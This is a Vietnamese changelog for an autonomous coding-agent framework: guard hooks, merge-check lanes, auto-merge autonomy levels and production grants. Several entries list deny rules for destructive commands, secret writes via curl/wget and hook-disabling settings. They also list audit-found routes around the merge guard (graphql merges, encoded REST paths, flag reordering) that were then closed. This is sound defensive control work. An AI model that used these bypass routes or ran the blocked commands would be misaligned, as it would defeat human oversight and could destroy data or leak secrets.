  `loop init` (chế độ nhanh) không gọi mạng; tag pre-release không tính. `AGENTS.md` §7 thêm luật cắt bản sớm khi thay
  đổi buộc dự án đích làm gì.
- **Máy trạng thái "merge theo làn" trong code: `xt.py pr next` + `pr reviewed`** (ADR-0025, D-038; thay một phần
  cách thực thi của ADR-0024, luật giữ nguyên). `pr next --pr N [--json]` là hàm thuần trên quyết định `merge-check`,
  trạng thái auto-merge của PR và sổ `.autopilot/reviews.json`, trả MỘT hành động (`enable-auto-merge`,
  `disable-auto-merge`, `review`, `fix`, `update`, `retarget`, `defer-human`, `merge`, `wait`, `done`, `closed`) kèm `do` và
  `fallback` (merge ghim head, cả `next_rest`); dưới L3 không bao giờ bật auto-merge (trả `merge` ghim head khi `merge-check` =
  `merge`); verdict `human` khi auto-merge đang bật → tắt trước; không gọi GitHub, guard vẫn là lớp chặn (đính chính AUD-DOC-054: chỉ khi `XT_GUARD_POLICY=strict`). `pr reviewed --pr N --head <SHA 40 ký tự>
  --clean|--blocking` ghi review gắn với commit đã rà; PR từng vào làn chuẩn được nhớ (`standard_seen`). Văn xuôi bảy
  bước ở `AGENTS.md` §3, mẫu `AGENTS.md` §7, skill `/autopilot` bước 10/13, README mảng 11, `LOOP-STOP-022` (SHOULD),
  `LOOP-DESIGN-020` (SHOULD) rút về "chạy `pr next`, làm đúng `do`" (không đổi mức). Dự án đích: chạy lại `install.py`.
- **Số đo vòng autopilot: `.autopilot/runs.jsonl` + `xt.py loop stats`** (`LOOP-DESIGN-024`, mục mới SHOULD; D-037).
  `evidence/T-xxx.json` bị ghi đè mỗi lần `loop record` nên không thấy các lần Gate đỏ trước khi xanh. Nay mỗi lần record
  nối một dòng (task, exit, chữ ký lỗi, thời điểm, HEAD, vòng) vào `runs.jsonl` (cục bộ, `.autopilot/` đã gitignore);
  `loop stats [--json] [--all]` tính số lần chạy/task, lần xanh đầu, tỉ lệ xanh lần đầu, task cần ≥ 3 lần, task chưa
  xanh, vòng đã dùng, việc chờ người (mặc định chỉ vòng hiện tại). Skill `/autopilot`: báo cáo cuối trích số này.
- **Sàn Gate theo quy mô M/L — máy kiểm thay cho kỷ luật** (`LOOP-HARNESS-023`, mục mới MUST@L; D-035). ADR-0011 chỉ chặn
  cổng rỗng/no-op nên `test: pytest tests/smoke.py` vẫn "xanh". Sàn không đoán tên công cụ: ở quy mô M/L (đọc `scale:`/
  `profile:` ở frontmatter `BLUEPRINT.md` như giá trị YAML — nháy, comment, chữ thường) `xt.yaml` phải khai lệnh thật,
  không rỗng/no-op, cho khoá mới `format_check` (kiểm format không ghi file) và `coverage` (test có ngưỡng, đỏ khi dưới
  ngưỡng), `typecheck` khi repo có `tsconfig.json`/`pyproject.toml`/`setup.cfg` (`build` với `go.mod`/`Cargo.toml`), `e2e`
  khi hồ sơ web-app/mobile-app/desktop-app/static-site/game. `xt.py doctor` cảnh báo `gate-floor`, `loop init` nhắc,
  `loop verify` ĐỎ khi thiếu khoá và **chạy** các lệnh sàn (trừ lệnh trùng Gate; ghi `verified.json.gate_floor`/
  `gate_floor_runs`, `final_check` nêu khoá đỏ) nên autopilot không ra `done` khi dưới sàn. S hoặc không có blueprint:
  không áp. Mẫu `xt.yaml` thêm hai khoá và mẫu theo stack đạt sàn; sửa `LOOP-HARNESS-008`, bảng cổng `harness-files.md`,
  skill `/autopilot` bước 0. Dự án đích ở M/L: khai `format_check`, `coverage` (và `e2e` theo hồ sơ) trước `loop verify`.
- **Blueprint không còn là lời khai: mục `[x]` mang lệnh kiểm máy chạy lại được** (`LOOP-DESIGN-023`, mục mới MUST@L; D-034).
  Ghi `— Kiểm: \`<lệnh>\`` ở cuối dòng mục đã tick (phần ghi chú sau `· Nguồn:`); `xt.py blueprint-status --run` chạy lại
  mọi lệnh trong thư mục chứa blueprint (mỗi lệnh một lần, timeout `XT_RECORD_TIMEOUT`), in `✓/✗ Kiểm <ID>`, JSON thêm
  `checks`, `failed_checks`, `unchecked_must` (MUST tick không có lệnh — chỉ báo, không đỏ); ghi chú `Kiểm:` sai dạng
  (không có lệnh trong backtick, thêm cặp backtick hoặc ghi chú `Kiểm:` thứ hai) = đỏ, exit 2; `--strict --run` exit 1 khi
  có lệnh đỏ; `--run` với stdin `-` → exit 2. `xt.py loop verify` chạy thêm các lệnh này (ghi `verified.json.blueprint`;
  `final_check` nêu ID đỏ) nên Stop hook không nhận `done` khi blueprint tick sai. `carry_states` giữ ghi chú `— Kiểm:` khi
  ghép lại; header blueprint sinh ra và `LOOP-DESIGN-022`, bảng cổng `loop-design.md`/`harness-files.md`, README mảng 11,
  `composition.md` bước 2, mẫu `AGENTS.md`/`GO-NO-GO.md`, skill `/autopilot` bước 12, `/blueprint` ghi `--strict --run`.
  Dự án đích: chạy lại `install.py`; mục đã tick chưa có lệnh hiện ở `unchecked_must`, thêm dần khi rà.
- **`merge-check` đọc chốt merge từ dữ liệu đã commit** (D-032, D-033; review #103/#105; chủ repo yêu cầu đọc
  `merge_autonomy` từ nhánh đích). `merge_risk_paths` = hợp của cây làm việc và `xt.yaml` đã commit ở nhánh đích
  (`merge_risk_globs`): checkout cũ hay sửa tại chỗ không làm rơi glob. `merge_autonomy` = mức THẤP hơn giữa cây làm việc
  và nhánh đích (`merge_autonomy_level`; guard và `merge-gate` dùng cùng đường): sửa tại chỗ không nâng được, nâng mức
  phải qua PR đã merge (chính PR đó được quyết ở mức cũ); không đọc được nhánh đích → L1 kèm ghi chú (`doctor` vẫn đọc
  cây làm việc; lời `LOOP-STOP-009` cập nhật, không đổi mức). "PR chạm khoá `merge_hard_exceptions`" (`HARD_KEY_REASON`, ADR-0020) giờ so danh sách mọi dòng khoá theo
  thứ tự (`_hard_key_lines`, cùng bộ đọc với `merge_hard_mode`) của `xt.yaml` gốc, không dò chuỗi trong patch: comment
  hay dòng ngữ cảnh nhắc tên khoá không còn báo `hard` nhầm; đầu PR có > 1 dòng khoá cũng là `hard`. Ủy quyền PLAN.md
  (ADR-0022) so danh sách mọi dòng `- grant:` theo thứ tự kèm cờ fence (`_grant_lines`) thay vì hiệu lực; đầu PR có grant
  trong fence hoặc nhóm lặp là `hard` — hai PR song song (chèn `live` bị dòng `sandbox` sau che + dời dòng `sandbox`)
  từng lật `payments` sang `live` mà không PR nào bị bắt. Đáy của cả hai phép so là merge-base (REST compare,
  `_merge_base`), không phải `base.sha`; không lấy được merge-base, không đọc được một đầu hoặc vắng ở cả hai đầu → `hard`.
- **Required check `merge-gate` — máy chặn auto-merge của PR ngoại lệ cứng trên head hiện tại** (ADR-0023, D-029; đóng
  giới hạn "auto-merge không ghim head" của ADR-0022). Lệnh mới `xt.py merge-gate [--pr N] [--pr-json F] [--head SHA]
  [--json]` dùng lại đường quyết định của `merge-check`: exit 1 khi `hard` ≠ rỗng **và** PR đang bật auto-merge (REST
  `auto_merge`, trường `autoMergeRequest`), `hard` không auto-merge → exit 0 kèm cảnh báo (người merge tay), 2 lỗi đọc PR,
  3 head khác `--head`. Workflow mới `.github/workflows/merge-gate.yml` trên `pull_request_target` (workflow + `xt.py` của
  nhánh mặc định — PR không sửa được cổng; không checkout code PR; token chỉ đọc), chạy lại khi push, đổi nhãn, đổi đích,
  bật/tắt auto-merge. Ruleset mẫu thêm context `merge-gate` (5 required check); `WF-CI-001` (MUST, không đổi mức) đổi
  "4" → "5 required check" và sửa phần Kiểm "đúng 3" → "đúng 5"; `LOOP-STOP-005`, `LOOP-STOP-026` ghi máy đỡ mới.
  `install.py --with-github` copy thêm `merge-gate.yml` (copy-if-absent; cảnh báo required check không còn liệt kê
  `merge-gate`). Lý do đổi cổng/CI: lời dặn `LOOP-STOP-005` thành cơ chế. **Chủ repo:** thêm `merge-gate` vào ruleset
  `main` đang chạy sau khi job chạy trên một PR. Dự án đích: chạy lại `install.py --with-github`, rồi thêm context.
- **Merge theo làn: PR quan trọng review sạch rồi bật auto-merge, PR khác bật khi mở** (ADR-0024, D-030, D-031; chủ repo
  yêu cầu cho khung và dự án đích): mở PR → `merge-check` báo làn `nhanh` thì bật auto-merge ngay; làn `chuẩn` (PR quan
  trọng: vùng nhạy cảm, nhãn `risk:`, > 150 dòng, nhiều gói, đổi mã không đổi test) → `reviewer` (model khác) rà diff →
  không còn lỗi chặn và `merge-check` không `hard` thì bật auto-merge; GitHub báo PR đã sẵn sàng thì merge bằng lệnh ghim head trong `next`. Review gắn với commit H đã rà:
  chỉ bật/merge khi head = H; PR đang bật auto-merge thì tắt TRƯỚC mỗi push, chạy lại `merge-check`, làn chuẩn thì rà lại H..head (merge nhánh đích: rà phần
  giải xung đột). Sửa `AGENTS.md`, mẫu
  `AGENTS.md`, skill `/autopilot`, `LOOP-STOP-005`, `LOOP-STOP-009`, `LOOP-STOP-022`, `LOOP-DESIGN-020`, `WF-REVIEW-007`, skill `/gate` (lời, không đổi
  mức). Repo khung khai `merge_risk_paths` (`scripts/*`, `framework/11-autonomous-loop/*`, `code-review.md`, `framework/templates/*`,
  `docs/adr/*`): PR nhỏ sửa bộ máy merge/ủy quyền hay luật vòng tự động vẫn vào làn chuẩn. Siết
  `grant-check`/`merge-check` theo review lần bốn của #102: chỉ `Not Found (HTTP 404)` là file vắng (`No commit found for the
  ref` thì không), và file trong diff mà 404 ở cả đáy lẫn đầu PR (token không đọc được contents) thì là `hard`.
- **Tối ưu thời gian check e2e**: 7 mục `SHOULD` mới ở `14-testing-quality/e2e-and-accessibility.md` — `QA-E2E-020` shard song
  song + gộp báo cáo blob, `QA-E2E-021` build một lần dùng lại, `QA-E2E-022` đăng nhập một lần (`storageState`), `QA-E2E-023` chọn
  test theo ảnh hưởng ở PR (suite đầy đủ trên `main`/trước deploy), `QA-E2E-024` đỏ sớm + huỷ run cũ, `QA-E2E-025` timeout ngắn
  và bớt việc thừa, `QA-E2E-026` ngân sách thời gian (PR ≤ 5 phút khi đã shard, trần cứng `QA-E2E-013` ≤ 10) và đo mỗi run.
  Mẫu `templates/xt.yaml` thêm khoá `e2e_affected`. Cờ Playwright xác minh 2026-10-18 từ playwright.dev.
- **Ủy quyền production trong PLAN + `xt.py grant-check`; hạn mức autopilot mặc định x2** (ADR-0022, D-027, D-028; chủ repo yêu cầu
  bật tự động tới production khi duyệt kế hoạch). Mẫu `templates/PLAN.md` có mục "Ủy quyền production" (dòng
  `- grant: <nhóm> | khoá=giá trị`, mặc định chỉ sandbox); lệnh mới `grant-check <nhóm> khoá=giá trị` exit 0 trong ủy quyền, 1 ngoài
  hoặc thiếu mục (→ `loop defer`), 2 tham số sai; đọc PLAN.md ở nhánh mặc định trên GitHub qua REST (không đọc cây làm việc hay ref cục bộ; `--plan` phải là
  `…/docs/autopilot/PLAN.md`), đòi khai đủ mọi khoá, từ chối số âm/`nan`/`inf`. PR đổi hiệu lực ủy quyền ở PLAN.md (so
  `parse_grants` đáy/đầu PR cho từng đường PLAN, kể cả đổi tên/sao chép vào; danh sách file bị cắt cũng tính) luôn do người
  merge, kể cả `merge_hard_exceptions: auto` (cùng chốt với khoá); PLAN.md là symlink (API trả file đích) hay mã lỗi khác
  `(HTTP 404)` = không đọc được. Giới hạn còn lại ghi ở ADR-0022 (auto-merge không ghim head; repo `gh` theo môi trường). Mục mới `LOOP-STOP-026` (SHOULD). `AGENTS.md` §5, mẫu `AGENTS.md`, skill `/autopilot` ghi "trừ việc
  nằm trong ủy quyền". Mặc định x2 khi PLAN bỏ trống số: trần vòng `max(40, 8 × task chưa làm)` (trước `max(20, 4 × task)`), 100
  vòng khi không `--single-session` (trước 50), `merge-watch --max-minutes` 240 (trước 120), khuyến nghị `--hours` ≤ 16. Sửa lỗi
  định dạng bước 13 của skill `/autopilot` (dấu nháy lặp quanh `<XT>`).
- **Mở PR xong chạy nền `xt.py merge-watch` (30 giây/lần)** (ADR-0021, D-026; chủ repo yêu cầu cho khung và dự án
  đích): lệnh mới gọi lại đúng `merge-check` mỗi `--interval` giây (mặc định 30, `--max-minutes` 120) tới khi verdict ≠
  `wait`; exit 0 đã merge/`merge`, 1 cần hành động, 2 lỗi đọc PR 3 lần liền, 3 hết giờ. Thành bước bắt buộc trong
  `AGENTS.md`, mẫu `templates/AGENTS.md`, skill `/autopilot` bước 13; `LOOP-STOP-022` (SHOULD, không đổi mức) thêm
  `merge-watch` vào phần Kiểm. Dự án đích: chạy lại `install.py` để nhận lệnh.
- **Chủ dự án tắt được chốt người của ngoại lệ cứng** (ADR-0020, D-024): khoá `xt.yaml` `merge_hard_exceptions: human|auto`
  đọc ở nhánh đích đã commit, không ở cây làm việc (thiếu/lạ/không đọc được = `human`). `auto`: `xt.py merge-check` trả
  `hard: []`, lý do chuyển sang `hard_waived` + một dòng `reasons`; PR vẫn làn chuẩn, ở L3 merge/bật auto-merge khi CI
  xanh, guard không chặn nữa. PR có diff `xt.yaml` chạm khoá luôn người merge (không tự miễn). Repo khung đặt `auto`
  theo yêu cầu chủ repo (2026-10-17); mẫu `templates/xt.yaml` đặt `human` (D-025). `LOOP-STOP-005` (MUST, không đổi mức) thêm điều
  kiện "trừ khi `merge_hard_exceptions: auto` + ghi chấp nhận rủi ro"; lời `LOOP-STOP-002`, `LOOP-STOP-009` cập nhật. Dự án đích muốn
  `auto`: mở PR thêm khoá, người merge.
- **Guard chặn đổi repo sang public qua `gh api`**: `gh api -X PATCH repos/<chủ>/<repo>` với `private=`/`visibility=`
  (mọi giá trị, như `gh repo edit --visibility`) hoặc thân `--input` (không xác minh được, như `archived=true`) → deny;
  PATCH endpoint con (`…/issues/1`) và `gh api repos/o/r` (GET) vẫn cho chạy. Dự án đích: chạy lại `install.py`.
- **Tài liệu điểm dừng khớp ADR-0018/0019** (D-023): `AGENTS.md` §5, mẫu `templates/AGENTS.md` §6 và `templates/PLAN.md`,
  skill `/autopilot`, mảng `11-autonomous-loop` bỏ mô tả "hook hỏi người" đã cũ, chia ba nhóm: máy chặn (`deny`) · cho
  chạy (deploy/publish, merge thường, sửa cổng/CI/hook kèm lý do, thêm phụ thuộc/MCP, ra mạng) · vẫn cần người qua
  `loop defer` (PR ngoại lệ cứng, tiền thật, dữ liệu người dùng thật, dịch vụ trả phí/khoá thật, bế tắc máy). Đổi lời
  phần Kiểm, không đổi mức: `LOOP-STOP-001` (xoá đệ quy ngoài dự án → deny), `LOOP-STOP-002`, `LOOP-STOP-003`,
  `LOOP-STOP-005`, `LOOP-STOP-023`, `LOOP-CI-001`, `LOOP-CI-007` — `ask` chỉ còn ở `XT_GUARD_POLICY=strict`.
- **Guard đóng các lỗ của audit dự án con** (#97, `AUDIT-REPORT-2026-10-17-subprojects.md`). Merge/bật auto-merge
  PR ngoại lệ cứng qua MỌI đường (`gh pr merge` không ghim head, `gh pr -R … merge`, `gh api` REST/graphql, MCP thiếu
  `expectedHeadSha`) bị chặn; không xác minh được `hard` (merge-check lỗi, repo khác, PR không rõ số, graphql merge,
  server MCP khác, guard.py lỗi/vắng, thiếu python3) cũng chặn (`UNVERIFIED_ASK`) — AUD-SEC-044/045. Tắt auto-merge
  (`--disable-auto`, MCP disable) không bị chặn. Gỡ hàng rào: Bash ghi/xoá/dời `.claude/hooks/*`/`.claude/settings*.json`,
  Edit/Write ghi `disableAllHooks: true`/`CLAUDE_CODE_SIMPLE` → chặn; thiếu `guard.py` → chặn mọi lệnh Bash trừ lệnh một
  dòng để xem/khôi phục (AUD-SEC-046). Push nhánh chính ngầm (refspec glob/`:`, `--branches`, `push.default`/
  `remote.*.push|mirror` qua `-c`/`git config`, `remote add --mirror`), huỷ đi đường khác (`gh api -X DELETE repos/…`,
  `PATCH archived=true`, `apply -destroy`, `pulumi down`), ghi bí mật qua `curl -o/-O`, `wget`, `rsync`, `patch`,
  `git checkout|restore <rev> -- <bí mật>`, script trình thông dịch ghi thẳng vào file → chặn (AUD-SEC-047…049). Heredoc
  chỉ thuộc pipeline chứa `<<` (trước: message commit cùng dòng với `python3 …` bị coi là script). Dự án đích: chạy lại
  `install.py`.
- **Guard — sửa theo review #97**: cờ `-R/--repo` của gh đứng trước lệnh con (`gh -R o/r pr merge`) đưa về sau để
  luật merge thấy (AUD-SEC-051); merge qua graphql đọc query từ `@file`/`--input`/`query=$Q` và REST viết lệch
  (`?x=1`, `%6Derge`) chặn như không xác minh được (AUD-SEC-053); `gh api` ghi bí mật/bảo vệ nhánh/ruleset/webhook/
  collaborator/transfer, `gh release delete`, `gh repo edit --visibility` = huỷ (AUD-SEC-054); `curl --output-dir`,
  `wget -P` ghép thư mục vào đích ghi (AUD-SEC-055); `git push origin heads/main` (AUD-SEC-056); `$(…)` trong nháy kép
  và trong heredoc dấu kết không nháy được quét (AUD-SEC-059); cấu hình push chỉ tính khi giá trị lan ra nhiều nhánh
  (`push.default=matching`, `remote.*.push|mirror`) và lệnh không có refspec, chỉ cho `git push` (AUD-SEC-052,
  AUD-HAR-055); thiếu guard.py: `restore_re` không nhận `python3 -c … install.py`, `--output` (AUD-SEC-057). Vòng 2: `git -ck=v`, `--config-env` (AUD-SEC-061);
  `gh api` environment/deploy key/khoá tài khoản/biến Actions, graphql `deleteRepository|transferRepository|archiveRepository`
  (AUD-SEC-062).
- **Dự án con**: hook cổng commit/auto-format dùng `.xtemplates/scripts/dev-task.sh` trước `scripts/dev-task.sh` riêng của
  dự án (AUD-HAR-049); `doctor` báo lỗi khi hook/settings còn `*.xtemplates-new` (AUD-HAR-050); `feedback aggregate
  --from p=<gốc repo>` tự nối `docs/xtemplates-feedback`, thư mục thiếu thì cảnh báo (AUD-HAR-051); install nói đúng khi
  giữ file riêng của dự án (AUD-HAR-052) và ghi SHA HEAD vào PROGRESS.md mới cài (AUD-HAR-053); phản hồi FB che tên người
  dùng trong đường dẫn home (`redact_feedback`, AUD-HAR-054); mẫu AGENTS.md/skill `/gate` trỏ `.xtemplates/scripts/`
  (AUD-DOC-041).
- **`merge-check` không còn xếp file harness agent vào ngoại lệ cứng "auth"** (D-020): mẫu đường dẫn auth khớp tiền tố
  `session`/`permission` nên `.claude/hooks/session-start.sh` (phiên agent) bị coi là xác thực → guard chặn agent
  merge/bật auto-merge (#93 phải người merge). Nay `.claude/`, `.xtemplates/`, `.codex/`, `.gemini/`, `.cursor/` miễn
  nhóm "auth" (vẫn làn chuẩn qua "cổng/CI"); code phiên/đăng nhập của ứng dụng và file bí mật trong harness vẫn là
  ngoại lệ cứng.
- Test hook: bảng ca của `PreBashGuardTest`, `PreEditGuardTest`, `GuardPolicyTest` gọi `guard` trong tiến trình test
  (`guard_decision`), mỗi loại quyết định giữ ca qua hook thật; `MergeGuardTest` chạy `xt.py merge-check` trong tiến
  trình, `test_merge_check_real_subprocess` giữ đường tiến trình con. `test_hooks` 41 → 29 s, cổng 1m03s → 50s dưới
  coverage. Đo: import thư viện coverage tốn ~92 ms mỗi tiến trình con — không tuỳ chọn `.coveragerc` nào giảm được.
- **Hook nhanh hơn ~2,7 lần ở đường nóng** (mỗi lệnh Bash: ~145 → ~54 ms; cổng của repo khung 3m11s → 1m55s).
  `_lib.sh` `py_run` chạy `guard.py`/`xt.py` bằng `import` (bytecode được cache; chạy như script thì Python biên dịch lại
  mỗi lần), cache đặt ở `$XDG_CACHE_HOME/xtemplates/pycache` (mặc định `~/.cache/…`) để không đẻ `__pycache__` trong dự
  án đích; `guard_fields` đọc kết quả `guard.py <mode> nul` một lần thay vì một tiến trình python cho mỗi trường JSON.
  Áp cho `pre-bash-guard`, `pre-edit-guard`, `pre-mcp-guard`, `stop-guard`, `pre-compact`, `session-start`. Quyết định
  của guard không đổi (đầu ra JSON giữ nguyên). Guard gọi `xt.py merge-check` cũng bằng import (cùng cache). Test
  `MergeGuardTest` 55 → 13 s dưới coverage: `gh` giả viết bằng `/bin/sh`, bảng ca gọi `guard` trong tiến trình test,
  đường ống hook (bash/MCP × allow/ask/deny) giữ ca chạy qua hook thật. Dự án đích: chạy lại `install.py`.
- **`xt.py validate` nhanh hơn ~40%** (khung thật 116 → 67 ms; `doctor` gọi nó): `resolve_modules` dùng `fnmatch.filter`
  (biên dịch mẫu một lần thay ~34k lần `fnmatch`), `load_docs` lọc tiền tố dòng trước regex và gom dòng có liên kết
  (`Doc.link_lines`) để `_check_links` khỏi duyệt lại thân tài liệu, kết quả `realpath` nhớ theo đường dẫn trong một lần
  `validate`. Ngữ nghĩa kiểm không đổi. Test: `test_xt` gọi CLI trong tiến trình (`xt_cli`), `test_doctor` nhớ kết quả
  `validate` theo chữ ký cây khung — hai file 23 → ~14 s dưới coverage.
- **Guard chặn merge PR ngoại lệ cứng** (ADR-0019, D-019; vá lỗ của ADR-0018): PR có `hard` (tiền/dữ liệu thật/auth/
  mật mã/bí mật) từng được tự merge vì lý do `ask` không mang dấu nguy hiểm. Nay `HARD_ASK` thuộc `DANGER_MARKERS`;
  `_merge_verdict` (`gh pr merge`, `gh api` REST, MCP) kiểm `hard` trước verdict; `pre-mcp-guard.sh` xuất `deny` (trước
  bỏ qua). Mẫu và gốc `AGENTS.md` ghi theo ADR-0018: hook không hỏi, bị chặn gồm bộ phân loại của chế độ Auto, autopilot
  mở phiên ở chế độ Auto (phiên cloud chọn Auto, CLI `--permission-mode auto`). Dự án đích: chạy lại `install.py`.
- **`install.py` gộp quyền ADR-0018 vào `.claude/settings.json` đã có của dự án** (trước: chỉ gộp khoá `hooks`, dự án đã
  cài vẫn dừng hỏi): thêm `Bash` vào `allow`, thêm `deny` của khung còn thiếu, gỡ `ask` mặc định cũ của khung
  (`git merge`, `git rebase`, `gh release`, `npm publish`, `docker push`); quyền riêng của dự án giữ nguyên. `CLAUDE.md`
  gốc và mẫu ghi theo ADR-0018, phiên cloud chọn chế độ Auto. Dự án đích: chạy lại `install.py`.
- **Hook guard không hỏi người nữa** (ADR-0018; chủ repo yêu cầu 2026-10-17). `guard.py` `apply_policy`: lệnh đang hỏi mà
  nguy hiểm/không đảo ngược (push thẳng `main`, `push --all/--tags`, xoá ngoài dự án, `stash drop/clear`,
  `gh repo delete|archive`, `gh secret`, `kubectl delete`, `terraform|tofu|pulumi destroy`, container có quyền máy chủ,
  tắt hook, ghi file bí mật qua Bash) → chặn; còn lại (publish, deploy, merge PR, `ssh`, cài gói, sửa cấu hình cổng…) →
  cho chạy. `permissions.ask` rỗng. Nhánh lỗi hạ tầng của hook (thiếu python3/`guard.py`, guard lỗi khi merge, commit
  vào repo ngoài dự án) cũng không hỏi (`_lib.sh` `ask_strict`). `XT_GUARD_POLICY=strict` giữ hành vi cũ.
- **Mọi lệnh Bash chạy không hỏi quyền** (ADR-0017; chủ repo yêu cầu 2026-10-16). `.claude/settings.json`
  `permissions.allow` gồm `Bash` thay danh sách `Bash(...)` hẹp (trước: `git push`, `git checkout <nhánh>`… vẫn hỏi ở chế
  độ `default`). Giữ nguyên `deny` (force-push, `reset --hard`, `git clean`, sudo, đọc `.env`/khoá…), `ask` (`git merge`,
  `git rebase`, publish) và hook guard. Mẫu `CLAUDE.md` ghi cách lấy lại lớp hỏi. Dự án đích: chạy lại `install.py`
  (`settings.json` đã có chỉ được gộp khoá `hooks`, quyền riêng giữ nguyên — muốn thì thêm tay `"Bash"` vào `allow`).
- `loop status`: bằng chứng "cũ hơn `loop init`" so thời điểm thay vì so chuỗi ISO (offset khác nhau từng cho kết quả
  sai, AUD-CODE-008); test no-op của `dev-task.sh` kiểm cả thông điệp đỏ (AUD-TEST-006).
- **L3 vẫn để người merge ngoại lệ cứng** (ADR-0016, D-012; audit delta đợt B, AUD-HAR-042). `merge-check` trả thêm
  `hard` — lý do ngoại lệ cứng (đường dẫn bí mật/auth/thanh toán/mật mã, nhãn `risk:auth|payment|pii|crypto|admin|secret`,
  `merge_risk_paths`), tính cả khi CI còn chạy — và verdict `human` cho PR đó ở mọi mức; guard không bật auto-merge
  (`gh pr merge --auto`, MCP `enable_pr_auto_merge`) khi có `hard`. Làn chuẩn còn lại vẫn auto-merge ở L3, lý do ghi
  "L3: làn chuẩn" thay vì "làn nhanh" (AUD-CODE-010). Check-run cùng tên của app khác không còn bị gộp, chỉ lần chạy lại
  cùng app thay lần cũ (AUD-CODE-007). Mục (ID, mức giữ): `LOOP-STOP-005` ghi "kể cả L3" + *Kiểm* `hard`;
  `LOOP-STOP-002` *Kiểm* bật auto-merge hỏi dưới L3 hoặc khi có `hard`, `gh api --input` (AUD-DOC-035); `LOOP-STOP-009`,
  `LOOP-STOP-022`, `LOOP-DESIGN-020` trừ PR có `hard`; `WF-REVIEW-007` miễn ở L3 chỉ cho `.github/`/hook/ruleset/migration.
  Bảng mức tự chủ ghi L3 do chủ dự án chọn bỏ qua bậc thang (AUD-DOC-033); skill `/autopilot`, mẫu `AGENTS.md`, README,
  mảng 11 thống nhất chữ L3 (AUD-DOC-031/032/036); `updated` của mẫu `AGENTS.md`/`CLAUDE.md` (AUD-DOC-037); ADR-0014 §1
  đọc lại với `delete_branch_on_merge` (GitHub tự đổi đích PR chồng — xác minh 2026-10-16, AUD-DOC-034). Dự án đích:
  chạy lại `install.py`, ghép lại blueprint để nhận chữ mới.
- **`AI-AGENT-013` nâng mức SHOULD → MUST@L** (ID giữ): mỗi tool khai thêm `tier` và `cost_class` (free/compute/llm/gpu),
  dựng catalog thất bại nếu thiếu; tool khai `readOnly` phải qua test hành vi (chạy trên snapshot rồi diff); không suy quyền
  từ tên tool. Dự án đích: ghép lại blueprint để nhận mức và chữ mới.
- Tài liệu harness khớp mã (audit 2026-10-16 đợt 5b): mô tả hook PreToolUse ở `CLAUDE.md` và `templates/CLAUDE.md` thêm
  hỏi khi làm yếu/xoá test, ghi tay `.autopilot/`, merge qua `gh api`/MCP, quét lệnh lồng, cổng trước `git commit`
  (AUD-HAR-031); `AGENTS.md` §6 liệt kê đủ thành phần cổng `lint` (AUD-DOC-029); skill `/audit` §6 trong autopilot tự
  duyệt kế hoạch sửa (ADR-0008), việc cần người `loop defer` trước `loop block` (AUD-HAR-032); ADR-0009 ghi công thức trần
  vòng bị ADR-0012 thay (AUD-DOC-026).
- **Mở PR là bật auto-merge — mức `merge_autonomy: L3`** (ADR-0015, D-011; chủ repo yêu cầu 2026-10-16, cho cả repo
  khung lẫn dự án đích). Mặc định của `xt.yaml` repo khung và mẫu `templates/xt.yaml` thành **L3** (trước: L2 / L1).
  `merge-check` ở L3 trả `merge` cho cả làn chuẩn và thêm `autonomy`, `stacked`; guard cho phép `gh pr merge <N> --auto`
  và MCP `enable_pr_auto_merge` khi L3, PR còn mở, không phải PR chồng, đúng repo, không `--admin`/cờ lạ. Mục (ID, mức
  giữ): `WF-REVIEW-007` thêm ngoại lệ L3 kèm ghi miễn trừ; `LOOP-STOP-002`, `LOOP-STOP-009`, `LOOP-STOP-022`,
  `LOOP-DESIGN-020` ghi L3. Đánh đổi (ADR-0015 §Hệ quả): mất ghim head và vị từ làn nhanh khi merge. Dự án đích: chạy
  lại `install.py`, bật "Allow auto-merge" + ruleset có required check; muốn người merge làn chuẩn thì đặt L2.
- **Áp hết ADR-0008 vào tài liệu** (audit 2026-10-16 đợt 5, AUD-DOC-023): `PM-PLAN-005` (ID, mức MUST giữ) bỏ "mâu thuẫn
  spec" khỏi danh sách cần người duyệt, thêm publish/deploy; nguyên tắc 6 của `planning-and-estimation.md`, bảng ca của
  `spec-driven-development.md`, bảng tách việc của `orchestration-and-subagents.md` và README (mục "Chạy tự động") ghi
  phiên chính tự duyệt kế hoạch/mâu thuẫn spec, ghi `D-NNN`. Dự án đích: ghép lại blueprint để nhận chữ mới của
  `PM-PLAN-005`. Đồng bộ khác: README số file mảng 00/11/templates, danh sách ADR thêm 0008–0010 (AUD-DOC-024/025);
  ADR-0013 ghi phần mở rộng (AUD-DOC-027); bảng lệnh mảng 11 thêm `loop decide --prod`
  (AUD-DOC-028).
- **Hook hỏi khi test đã có bị làm yếu** (`LOOP-CI-001`). `guard.py edit` (qua `pre-edit-guard.sh`, Edit/Write/MultiEdit)
  trả `ask` khi lần sửa một file test **đã có** (`test_*.py`, `*.test.*`, `*.spec.*`, `*_test.go`, `tests/`, `__tests__/`…)
  thêm dấu skip/only/xfail/`@flaky` hoặc bớt lời gọi kiểm (`assert*`, `expect(`, `t.Error`…). File test mới, file không
  phải test, file không đọc được → không hỏi (fail-open). Từ playbook AI-native SDLC của Anthropic (stage Test: agent sửa
  lỗi không được làm yếu bài kiểm của chính đoạn code nó sửa). `LOOP-CI-001` thêm *Kiểm* cho hook (ID, mức giữ).
  Dự án đích: chạy lại `install.py` để nhận `guard.py` mới (hook copy-if-absent → gộp tay `*.xtemplates-new`).
- **Gắn `@flaky`/cách ly test là nới cổng** (`LOOP-CI-012`, ID và mức SHOULD giữ): agent ghi bằng chứng (run đỏ và xanh
  cùng SHA) và mở issue; gắn nhãn/cách ly khỏi cổng đi qua người duyệt (`loop defer`), không tự làm trong vòng tự động.
  Trước đây bảng "Loại lỗi CI" cho agent tự đánh dấu flaky, trái với nguyên tắc 1 của chính module. Bảng, nguyên tắc 1,
  bẫy và cổng tự động của `self-healing-ci.md` cập nhật theo.
- `xt.py merge-check` lấy dữ liệu PR qua **REST** (`gh api`: `pulls/N`, `pulls/N/files`, `pulls/N/reviews`, `commits/SHA/check-runs`, `commits/SHA/status`, tra PR theo nhánh bằng `pulls?head=`) thay cho `gh pr view` (GraphQL), vì phiên Claude Code chặn GraphQL (HTTP 403). Dữ liệu được dựng lại đúng dạng `gh pr view --json` nên logic quyết định và `--pr-json` không đổi. REST không có `reviewDecision`: suy từ review mới nhất của mỗi người (DISMISSED xoá), và `mergeable_state` BLOCKED (GitHub tính cả branch protection) → `REVIEW_REQUIRED` → `human` — chặt hơn, không lỏng hơn (D-009). `--pr` nhận số, `#số`, URL PR hoặc tên nhánh. `LOOP-STOP-022` cập nhật mô tả (ID, mức giữ).
